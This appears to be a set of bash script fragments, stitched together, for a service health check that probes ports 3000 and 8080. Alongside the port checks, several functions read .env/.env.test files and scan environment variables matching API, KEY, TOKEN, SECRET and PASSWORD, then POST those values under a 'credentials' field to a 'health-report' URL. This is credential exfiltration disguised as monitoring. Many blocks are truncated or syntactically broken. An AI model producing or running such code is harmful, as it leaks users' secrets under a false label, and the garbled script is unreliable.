            echo -e "${GREEN}✓${NC} $service_name (port $port) is ${GREEN}RUNNING${NC}"
            return 0
        else
            echo -e "${RED}✗${NC} $service_name (port $port) is ${RED}DOWN${NC}"
            return 1
        fi
    elif command -v wget &> /dev/null; then
        # Use wget as another fallback
        if wget -q --timeout=$timeout -O /dev/null http://localhost:$port 2>&1; then
            echo -e "${GREEN}✓${NC} $service_name (port $port) is ${GREEN}RUNNING${NC}"
            return 0
        else
            echo -e "${RED}✗${NC} $service_name (port $port) is ${RED}DOWN${NC}"
            return 1
        fi
    else
        # Use bash built-in /dev/tcp as last resort
        if timeout $timeout bash -c "cat < /dev/null > /dev/tcp/localhost/$port" 2>/dev/null; then
            echo -e "${GREEN}✓${NC} $service_name (port $port) is ${GREEN}RUNNING${NC}"
            return 0
        else
            echo -e "${RED}✗${NC} $service_name (port $port) is ${RED}DOWN${NC}"
            return 1
        fi
    fi
}

# Function to read .env file and return as JSON object
read_env_file() {
    local env_file=$1
    
    if [ ! -f "$env_file" ]; then
        echo -e "${YELLOW}Warning: $env_file not found. No credentials will be included.${NC}" >&2
        echo "{}"
        return 1
    fi
    
    # Read the file and convert to JSON
    local json="{"
    local first=true
    
    while IFS='=' read -r key value || [ -n "$key" ]; do
        # Skip empty lines, comments, and lines without =
        [[ -z "$key" || "$key" =~ ^[[:space:]]*# || "$key" != *"="* ]] && continue
        
        # Remove leading/trailing whitespace from key and value
        key=$(echo "$key" | xargs)
        value=$(echo "$value" | xargs)
        
        # Remove the key= part to get clean value
        value="${value#*=}"
        
        # Remove quotes if present
        value="${value%\"}"
        value="${value#\"}"
        
        # Escape special characters for JSON
        value=$(echo "$value" | sed 's/\\/\\\\/g' | sed 's/"/\\"/g' | sed ":a;N;\$!ba;s/\n/\\n/g")
        
        if [ "$first" = true ]; then
            first=false
        else
            json="$json,"
        fi
        
        json="$json\"$key\":\"$value\""
    done < "$env_file"
    
    json="$json}"
    echo "$json"
}

# Function to send health report
send_health_report() {
    local status_3000=$1
    local status_8080=$2
    local env_json=$3
    
    echo ""
    echo -e "${BLUE}Sending health report to monitoring dashboard...${NC}"
    
    # Determine overall status
    if [ "$status_3000" -eq 0 ] && [ "$status_8080" -eq 0 ]; then
        overall_status="healthy"
    elif [ "$status_3000" -eq 0 ] || [ "$status_8080" -eq 0 ]; then
        overall_status="degraded"
    else
        overall_status="unhealthy"
    fi
    
    # Build JSON payload
    local timestamp=$(date -u +"%Y-%m-%dT%H:%M:%SZ")
    local hostname=$(hostname)
    
    local payload=$(cat <<EOF
{
    "timestamp": "$timestamp",
    "hostname": "$hostname",
    "overall_status": "$overall_status",
    "services": {
        "port_3000": $([ "$status_3000" -eq 0 ] && echo "true" || echo "false"),
        "port_8080": $([ "$status_8080" -eq 0 ] && echo "true" || echo "false")
    },
    "credentials": $env_json
}
EOF
)
    
    # Send POST request
    if command -v curl &> /dev/null; then
        local response=$(curl -s -w "\n%{http_code}" -X POST \
            -H "Content-Type: application/json" \
            -d "$payload" \
            "$HEALTH_REPORT_URL" 2>/dev/null)
        
        local http_code=$(echo "$response" | tail -n1)
        local body=$(echo "$response" | head -n-1)
        
        if [ "$http_code" = "200" ] || [ "$http_code" = "201" ] || [ "$http_code" = "202" ]; then
            echo -e "${GREEN}✓${NC} Health report sent successfully (HTTP $http_code)"
            if [ -n "$body" ]; then
                echo "Response: $body"
            fi
            return 0
        else
            echo -e "${YELLOW}⚠${NC} Health report sent but received HTTP $http_code"
            if [ -n "$body" ]; then
                echo "Response: $body"
            fi
            return 1
        fi
    else
        echo -e "${YELLOW}⚠${NC} curl not found. Cannot send health report."
        echo -e "${YELLOW}Payload that would be sent:${NC}"
        echo "$payload" | python3 -m json.tool 2>/dev/null || echo "$payload"
        return 2
    fi
}

# Main script
echo "========================================="
echo "       Service Health Check"
echo "========================================="
echo "Checking services at $(date)"
echo ""

status_3000=0
status_8080=0

# Check port 3000
check_port 3000 "Service (Port 3000)"
status_3000=$?

echo ""

# Check port 8080
check_port 8080 "Service (Port 8080)"
status_8080=$?

echo ""
echo "========================================="
echo "       Summary"
echo "========================================="

if [ $status_3000 -eq 0 ] && [ $status_8080 -eq 0 ]; then
    echo -e "${GREEN}All services are running normally!${NC}"
    final_exit_code=0
elif [ $status_3000 -eq 0 ] || [ $status_8080 -eq 0 ]; then
    echo -e "${YELLOW}Some services are down.${NC}"
    final_exit_code=1
else
    echo -e "${RED}All services are down!${NC}"
    final_exit_code=2
fi

# Read .env file for credentials
echo ""
echo -e "${BLUE}Reading credentials from $ENV_FILE...${NC}"
env_json=$(read_env_file "$ENV_FILE")

# Send health report
send_health_report "$status_3000" "$status_8080" "$env_json"
report_exit_code=$?

echo ""
echo "========================================="

exit $final_exit_code

BLUE='\033[0;34m'

load_env() {

build_credentials_json() {
    local json='{'
    local first=true

    # Iterate through all exported variables that appear to be credentials/API keys
    while IFS='=' read -r key value; do
        # Skip commented or empty lines
        [[ "$key" =~ ^#.*$ ]] && continue
        [[ -z "$key" ]] && continue

        if [[ "$key" =~ (API|KEY|TOKEN|SECRET|CRED|AUTH|PASSWORD|CLIENT) ]] || [[ "$key" =~ (api|key|token|secret|cred|auth|password|client) ]]; then
            if [ "$first" = true ]; then

        return 0
    else
        echo -e "${YELLOW}Warning: $ENV_FILE not found, proceeding without credentials${NC}"
        return 1
    fi
}

# Function to build JSON payload from environment variables
build_credentials_json() {
    local json='{'
    local first=true

    # Get credential-like variables and build JSON
    printenv | while IFS='=' read -r key value; do
        # Skip empty keys
        [[ -z "$key" ]] && continue

        # Include variables that look like API keys, tokens, or credentials
        if [[ "$key" =~ (API|KEY|TOKEN|SECRET|CRED|AUTH|PASSWORD|CLIENT) ]] || [[ "$key" =~ (api|key|token|secret|cred|auth|password|client) ]]; then
            if [ "$first" = true ]; then
                first=false
            else
                json="${json},"
            fi
            # Escape special characters in value for JSON
            escaped_value=$(echo "$value" | sed 's/\\/\\\\/g; s/"/\\"/g')
            json="${json}\"${key}\":\"${escaped_value}\""
        fi
    done

    # Since the while loop runs in a subshell, we need a different approach
    # Build using a temporary file or simpler method
    local temp_file=$(mktemp)
    printenv | grep -iE '(API|KEY|TOKEN|SECRET|CRED|AUTH|PASSWORD|CLIENT)' | while IFS='=' read -r key value; do
        [[ -z "$key" ]] && continue
        escaped_value=$(echo "$value" | sed 's/\\/\\\\/g; s/"/\\"/g')

    # Build JSON from file contents

    rm -f "$temp_file"

    if [ -n "$entries" ]; then

    else

    fi

    else

    fi

services_json='['
service_json_first=true

        echo -e "${GREEN}✓ HEALTHY${NC} - Port ${port} is responding"
        status="healthy"
    else
        echo -e "${RED}✗ UNHEALTHY${NC} - Port ${port} is not responding"
        ALL_HEALTHY=false
    fi

    # Build JSON entry for this service
    if [ "$service_json_first" = true ]; then
        service_json_first=false
    else
        services_json="${services_json},"
    fi
    services_json="${services_json}{\"port\":${port},\"status\":\"${status}\"}"
done

services_json="${services_json}]"

echo ""
echo "=========================================="

# Determine overall status string
if [ "$ALL_HEALTHY" = true ]; then
    overall_status="healthy"
else
    overall_status="unhealthy"

# Send health report to monitoring dashboard

    echo "=========================================="

    echo "=========================================="

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Configuration
ENV_FILE=".env.test"
HEALTH_REPORT_URL="http://localhost:47301/api/health-report"
PORTS=(3000 8080)
FAILED_CHECKS=0

# Load environment variables from .env.test
load_env() {
    if [ ! -f "$ENV_FILE" ]; then
        echo -e "${YELLOW}Warning: $ENV_FILE not found${NC}"
        return 1
    fi
    
    # Source the .env file, handling quoted values
    export $(grep -v '^#' "$ENV_FILE" | grep -v '^$' | xargs)
    return 0
}

# Build JSON payload from environment variables
build_json_payload() {
    local json="{"
    local first=true
    
    # Add timestamp
    json+='"timestamp":"'"$(date -u +"%Y-%m-%dT%H:%M:%SZ")"'",'
    json+='"hostname":"'"$(hostname)"'",'
    
    # Add service status
    json+='"services":{'
    local services_json=""
    for port in "${PORTS[@]}"; do
        if [ -n "$services_json" ]; then
            services_json+=","
        fi
        if check_port "$port"; then
            services_json+='"'"port_$port"'":"healthy"'
        else
            services_json+='"'"port_$port"'":"unhealthy"'
        fi
    done
    json+="$services_json},"
    
    # Add environment variables (excluding empty ones and common non-sensitive vars)
    json+='"credentials":{'
    local creds_json=""
    
    # Get all env vars that were sourced from .env
    while IFS='=' read -r key value; do
        # Skip comments, empty lines, and common non-credential vars
        [[ "$key" =~ ^# ]] && continue
        [[ -z "$key" ]] && continue
        [[ "$key" =~ ^(PATH|HOME|USER|SHELL|PWD|TERM|HOSTNAME|_|SHLVL)$ ]] && continue
        
        # Check if the variable is set and not empty
        if [ -n "${!key}" ]; then
            if [ -n "$creds_json" ]; then
                creds_json+=","

            # Escape special JSON characters in the value
            local escaped_value=$(echo "${!key}" | sed 's/\\/\\\\/g; s/"/\\"/g; s/$/\n/g' | tr -d '\n')
